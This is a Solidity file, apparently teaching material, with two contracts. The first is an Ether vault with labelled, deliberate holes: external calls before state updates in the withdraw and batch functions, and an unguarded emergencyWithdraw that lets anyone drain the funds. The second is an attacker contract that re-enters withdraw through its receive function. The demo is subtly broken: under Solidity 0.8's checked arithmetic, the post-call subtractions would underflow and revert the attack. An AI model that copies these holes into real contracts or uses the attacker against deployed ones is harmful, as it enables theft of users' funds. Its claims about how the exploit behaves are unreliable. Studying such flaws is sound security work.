// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title ReentrancyVulnerable
 * @dev Demonstrates common reentrancy vulnerabilities
 * 
 * VULNERABILITIES:
 * 1. External calls before state updates
 * 2. No reentrancy protection
 * 3. Missing access controls on emergency functions
 * 4. Improper batch operation validation
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => bool) public depositors;
    uint256 public totalDeposits;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed user, uint256 amount);
    
    /**
     * @dev Deposit Ether to the contract
     */
    function deposit() external payable {
        require(msg.value > 0, "Amount must be positive");
        
        balances[msg.sender] += msg.value;
        depositors[msg.sender] = true;
        totalDeposits += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev Vulnerable withdraw function - external call before state update
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(amount > 0, "Amount must be positive");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call - too late!
        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev Vulnerable withdrawAll function
     */
    function withdrawAll() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update after external call
        balances[msg.sender] = 0;
        totalDeposits -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev Vulnerable emergency withdraw - no access control
     */
    function emergencyWithdraw() external {
        // VULNERABILITY: No access control - anyone can drain the contract
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No funds to withdraw");
        
        (bool success, ) = msg.sender.call{value: contractBalance}("");
        require(success, "Transfer failed");
        
        // Reset all balances without proper accounting
        totalDeposits = 0;
        
        emit EmergencyWithdraw(msg.sender, contractBalance);
    }
    
    /**
     * @dev Vulnerable batch withdraw function
     */
    function batchWithdraw(address[] calldata recipients, uint256[] calldata amounts) external {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            // VULNERABILITY: No validation that sender has sufficient balance for all withdrawals
            // VULNERABILITY: External calls in loop without reentrancy protection
            require(balances[msg.sender] >= amounts[i], "Insufficient balance");
            
            (bool success, ) = recipients[i].call{value: amounts[i]}("");
            require(success, "Transfer failed");
            
            balances[msg.sender] -= amounts[i];
            totalDeposits -= amounts[i];
        }
    }
    
    /**
     * @dev Get balance of a user
     */
    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @dev Get balance of a user (alias for compatibility)
     */
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @dev Get contract's total balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Check if address is a depositor
     */
    function isDepositor(address user) external view returns (bool) {
        return depositors[user];
    }
    
    /**
     * @dev Fallback function to receive Ether
     */
    receive() external payable {
        // Allow contract to receive Ether
    }
}

/**
 * @title MaliciousReentrancyAttacker
 * @dev Example attacker contract to demonstrate reentrancy
 */
contract MaliciousReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;
    
    constructor(address payable _target) {
        target = ReentrancyVulnerable(_target);
    }
    
    function setAttackAmount(uint256 _amount) external {
        attackAmount = _amount;
    }
    
    function attack() external payable {
        require(msg.value >= attackAmount, "Insufficient attack funds");
        
        // Deposit first
        target.deposit{value: attackAmount}();
        
        // Start the reentrancy attack
        target.withdraw(attackAmount);
    }
    
    // This function will be called when the vulnerable contract sends Ether
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= attackAmount) {
            attackCount++;
            target.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}